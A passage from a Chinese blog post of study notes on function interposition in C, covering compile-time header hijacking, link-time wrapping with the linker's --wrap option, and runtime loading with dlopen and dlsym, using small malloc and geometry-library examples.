class="type">void</span> <span class="title function_">myfree</span><span class="params">(<span class="type">void</span>*)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;free啥也不干&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="命令">命令:</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -c mymalloc.c</span><br><span class="line"></span><br><span class="line">gcc -I. -o main main.c mymalloc.c</span><br><span class="line"></span><br><span class="line">./main</span><br></pre></td></tr></table></figure>
<blockquote>
<p>gcc搜索头文件的规则</p>
<blockquote>
<p>当#include &lt;headerfile.h&gt;
时，编译时按照"<code>编译命令指定目录---&gt;系统预设目录---&gt;编译器预设</code>"的顺序搜索头文件。</p>
<p>当#include
"headerfile.h"，编译时按照"<code>源文件当前目录---&gt;编译命令指定目录---&gt;系统预设目录---&gt;编译器预设</code>"的顺序搜索头文件。</p>
</blockquote>
<p>我们在使用glibc库函数时一般使用<code>&lt;malloc.h&gt;</code>,在不加编译命令时,编译器根本不会在当前工作目录下搜索这种尖括号头文件</p>
<p>而我们现在就想给他劫持到搜索当前工作目录,这就是编译时打桩</p>
<p>怎么实现这个头文件劫持呢?编译时加入<code>-I</code>选项,意思是告诉编译器,在搜索系统预设目录前,先按照编译命令指定目录(<code>-I.</code>这里的点号<code>.</code>就是当前目录)搜索头文件.</p>
<p>当前文件夹下恰好有我们自己写的同名头文件malloc.h,只要能找到,编译器就不会再在其他目录找这个头文件</p>
<p>然后在链接时需要给出我们自己写的<code>malloc.h</code>中的两个函数引用<code>mymalloc</code>和<code>myfree</code>,这就是<code>mymalloc.c</code>要做的事情了</p>
</blockquote>
<p>运行结果:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc啥也不干malloc啥也不干</span><br></pre></td></tr></table></figure>
<blockquote>
<p>实际上glibc中的malloc从未被调用过</p>
<p>总结预编译时打桩的步骤:</p>
<p>1.修改库函数头文件搜索位置</p>
<p>2.链接新的实现</p>
</blockquote>
<p>但是吧,PWN的题目都是给出一个已经编译链接完成的可执行目标文件.谁会让你在预编译阶段做手脚呢?</p>
<p>只能说,没用的知识又怎加了</p>
<h4 id="链接时打桩">链接时打桩</h4>
<h5 id="main.c-3"><code>main.c</code></h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> *p=<span class="built_in">malloc</span>(<span class="number">510</span>);</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时<code>main.c</code>看起来还是非常正常的,使用<code>gcc main.c -o main</code>可以编译链接得到一个正儿八经的程序</p>
<p>下面用链接时打桩给他劫持喽</p>
<h5 id="mymalloc.c-1"><code>mymalloc.c</code></h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *__real_malloc(<span class="type">size_t</span>);		<span class="comment">//对glibc中真·库函数malloc的引用</span></span><br><span class="line"><span class="type">void</span> *__real_free(<span class="type">void</span> *);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *__wrap_malloc(<span class="type">size_t</span> size)&#123;	<span class="comment">//包装函数</span></span><br><span class="line">    <span class="type">void</span> *ptr=__real_malloc(<span class="number">510</span>);<span class="comment">//包装函数会调用真函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;in wrapper malloc\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> *__wrap_free(<span class="type">void</span> *ptr)&#123;</span><br><span class="line">    __real_free(ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;in wrapper free\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为啥函数名前面要假设<code>__real,__wrap</code>这种前缀?</p>
<h5 id="命令-1">命令</h5>
<p><code>shellscript.sh</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gcc -c mymalloc.c		<span class="meta">#mymalloc.c编译成可重定位目标文件</span></span><br><span class="line">	</span><br><span class="line">gcc -c main.c			<span class="meta">#main.c编译成可重定位目标文件</span></span><br><span class="line"></span><br><span class="line">gcc -Wl,--wrap,<span class="built_in">malloc</span> -Wl,--wrap,<span class="built_in">free</span>  -o  prog main.o mymalloc.o	</span><br><span class="line">    </span><br><span class="line">./prog</span><br></pre></td></tr></table></figure>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Wl,&lt;options&gt;            Pass comma-separated &lt;options&gt; on to the linker.</span><br></pre></td></tr></table></figure>
<blockquote>
<p>comma-separated 用逗号分开的</p>
<p>给链接器传递用逗号分开的<选项></p>
</blockquote>
<p><code>--wrap,malloc</code>的作用是,链接器将malloc这个符号解析为<code>__wrap_malloc</code>这个符号,并且将<code>__real_malloc</code>这个符号解析为<code>malloc</code></p>
<p>那么在<code>main.c</code>中调用malloc时会被链接器重定位到<code>__wrap_malloc</code>的定义,</p>
<p>真正的glibc库中的<code>malloc</code>需要使用<code>__real_malloc</code>调用</p>
</blockquote>
<p>运行结果:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/link]</span><br><span class="line">└─# ./shellscript.sh</span><br><span class="line"><span class="keyword">in</span> wrapper malloc</span><br><span class="line"><span class="keyword">in</span> wrapper free</span><br></pre></td></tr></table></figure>
<p>同样的道理,CTF题也不会让在链接阶段办手续,又是没用的知识</p>
<h4 id="运行时打桩">运行时打桩</h4>
<h5 id="运行时加载链接共享库">运行时加载链接共享库</h5>
<p>Linux系统为<strong>动态链接器</strong>提供的<strong>系统调用</strong>:]</p>
<h6 id="dlopen"><code>dlopen</code></h6>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">dlopen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename,<span class="type">int</span> flag)</span>;<span class="comment">//成功则返回指向句柄的指针,一个代表共享库的句柄handle</span></span><br></pre></td></tr></table></figure>
<p>加载链接共享库<code>filename</code></p>
<p>flag参数值含义:</p>
<p><code>RTLD_GLOBAL</code>用其他用该选项打开的库解析filename库中的外部符号</p>
<p><code>RTLD_NOW</code>,链接器立刻解析外部符号引用</p>
<p><code>RTLD_LAZY</code>,链接器不得不解析外部符号时才进行解析</p>
<h6 id="dlsym"><code>dlsym</code></h6>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">dlsym</span><span class="params">(<span class="type">void</span> *handle,<span class="type">char</span> *symbol)</span>;</span><br></pre></td></tr></table></figure>
<p><code>handle</code>是<code>dlopen</code>的返回值,即指向共享库句柄的指针</p>
<p><code>symbol</code>是handle指向的共享库中的符号,比如一个全局变量或者一个符号</p>
<p>如果存在则返回该symbol的地址,否则返回NULL</p>
<h6 id="dlclose"><code>dlclose</code></h6>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dlclose</span><span class="params">(<span class="type">void</span> *handle)</span>;</span><br></pre></td></tr></table></figure>
<p>卸载handle指向的共享库</p>
<h6 id="dlerror"><code>dlerror</code></h6>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *<span class="title function_">dlerror</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure>
<p>返回字符串,内容是最近调用前面三个函数时发生的错误,如果妹有错误则返回NULL</p>
<h6 id="举个例子-1">举个例子</h6>
<p>由于gcc会隐式加载链接glibc.so库,我们需要自己写一个动态库,比如<code>geometry</code></p>
<blockquote>
<p><code>geometry.h</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> GEOMETRY</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GEOMETRY</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">        <span class="type">double</span> x;</span><br><span class="line">        <span class="type">double</span> y;</span><br><span class="line">    &#125;Point;</span><br><span class="line">    <span class="type">double</span> <span class="title function_">getEuclideanDistance</span><span class="params">(Point,Point)</span>;   <span class="comment">//计算两点之间的欧几里得距离</span></span><br><span class="line">    <span class="type">double</span> <span class="title function_">getManhattanDistance</span><span class="params">(Point,Point)</span>;   <span class="comment">//计算两点之间的曼哈顿距离</span></span><br><span class="line">    Point <span class="title function_">newPoint</span><span class="params">(<span class="type">double</span>,<span class="type">double</span>)</span>;      <span class="comment">//构造新点</span></span><br><span class="line">    <span class="type">void</span> <span class="title function_">showPoint</span><span class="params">(Point)</span>;              <span class="comment">//打印点坐标</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p><code>geometry.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;geometry.h&quot;</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">double</span> PI=<span class="number">3.1415926</span>;</span><br><span class="line"><span class="type">double</span> <span class="title function_">getEuclideanDistance</span><span class="params">(Point a,Point b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>((a.x-b.x)*(a.x-b.x)+(a.y-b.y)*(a.y-b.y));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">double</span> <span class="title function_">getManhattanDistance</span><span class="params">(Point a,Point b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">abs</span>(a.x-b.x)+<span class="built_in">abs</span>(a.y-b.y);</span><br><span class="line">&#125;</span><br><span class="line">Point <span class="title function_">newPoint</span><span class="params">(<span class="type">double</span> x,<span class="type">double</span> y)</span>&#123;</span><br><span class="line">    Point a;</span><br><span class="line">    a.x=x;</span><br><span class="line">    a.y=y;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">showPoint</span><span class="params">(Point p)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(%.2f,%.2f)&quot;</span>,p.x,p.y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译成动态库<code>libgeometry.so</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fpic -o libgeometry.so geometry.</span><br></pre></td></tr></table></figure>
</blockquote>
<p><code>main.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;geometry.h&quot;</span>		<span class="comment">//引入该头文件的主要作用是,获得Point结构体的定义</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">void</span> *handle=dlopen(<span class="string">&quot;./libgeometry.so&quot;</span>,RTLD_LAZY);</span><br><span class="line">    <span class="keyword">if</span>(!handle)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;%s\n&quot;</span>,dlerror());</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Point (*newPoint)(<span class="type">double</span>,<span class="type">double</span>)=dlsym(handle,<span class="string">&quot;newPoint&quot;</span>);<span class="comment">//函数指针指向handle库中&quot;newPoint&quot;符号</span></span><br><span class="line">    <span class="type">void</span> (*showPoint)(Point)=dlsym(handle,<span class="string">&quot;showPoint&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!newPoint||!showPoint)&#123;			<span class="comment">//检查newPoint和showPoint是否真的获得了地址</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;%s\n&quot;</span>,dlerror());</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    Point p=newPoint(<span class="number">1.2</span>,<span class="number">3.4</span>);			</span><br><span class="line">    showPoint(p);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(dlclose(handle)&lt;<span class="number">0</span>)&#123;	<span class="comment">//卸载动态库</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;%s\n&quot;</span>,dlerror());</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Point (*newPoint)(<span class="type">double</span>,<span class="type">double</span>);</span><br></pre></td></tr></table></figure>
<p>声明一个返回值为Point类型,双参数都是double类型的函数指针</p>
</blockquote>
<p>编译命令:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/runtimelink]</span><br><span class="line">└─# gcc -rdynamic -o prog main.c -ldl</span><br></pre></td></tr></table></figure>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://lenky.info/tag/rdynamic/">-rdynamic</a> 却是一个 <a
target="_blank" rel="noopener" href="http://gcc.gnu.org/onlinedocs/gcc/Link-Options.html">连接选项</a>
，它将指示连接器把所有符号（而不仅仅只是程序已使用到的外部符号）都添加到动态符号表（即.dynsym表）里，以便那些通过
<a
target="_blank" rel="noopener" href="http://man7.org/linux/man-pages/man3/dlopen.3.html">dlopen()</a>
或 <a
target="_blank" rel="noopener" href="http://www.kernel.org/doc/man-pages/online/pages/man3/backtrace.3.html">backtrace()</a>
（这一系列函数使用.dynsym表内符号）这样的函数使用。</p>
<p>添加-rdynamic选项后，.dynsym表就包含了所有的符号，不仅是已使用到的外部动态符号，还包括本程序内定义的符号，比如bar、foo、baz等。</p>
<p>参考博客<a
target="_blank" rel="noopener" href="https://blog.csdn.net/fengdijiang/article/details/108882608">gcc或g++的编译选项
-shared -fPIC 与 -g -rdynamic
部分转载_字正腔圆的博客-CSDN博客_rdynamic</a></p>
<p><code>-ldl</code>的作用是链接<code>dlfcn</code>库,是我们能够使用<code>dlopen</code>这种函数</p>
</blockquote>
<p>运行结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/runtimelink]</span><br><span class="line">└─# ./prog</span><br><span class="line">(1.20,3.40)</span><br></pre></td></tr></table></figure>
<h5 id="运行时打桩-1">运行时打桩</h5>
<p>运行时打桩的思想是,自己写一个家的<code>malloc</code>函数,该函数使用dlopen等函数在运行时加载<code>glibc</code></p>
<p>奇怪,我按照CSAPP的说法做的实验,结果会报告段错误,留作后话吧</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/impossible/page/8/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/impossible/">1</a><span class="space">&hellip;</span><a class="page-number" href="/impossible/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/impossible/page/10/">10</a><a class="extend next" rel="next" href="/impossible/page/10/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="dustball"
      src="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
  <p class="site-author-name" itemprop="name">dustball</p>
  <div class="site-description" itemprop="description">dustland</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">39</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">dustball</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  
  <script data-pjax>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
<script src="/js/algolia-search.js"></script>












<script data-pjax>
if (document.querySelectorAll('pre.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
    mermaid.initialize({
      theme    : 'dark',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    });
  }, window.mermaid);
}
</script>


    <div id="pjax">
  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

    </div>
</body>
</html>
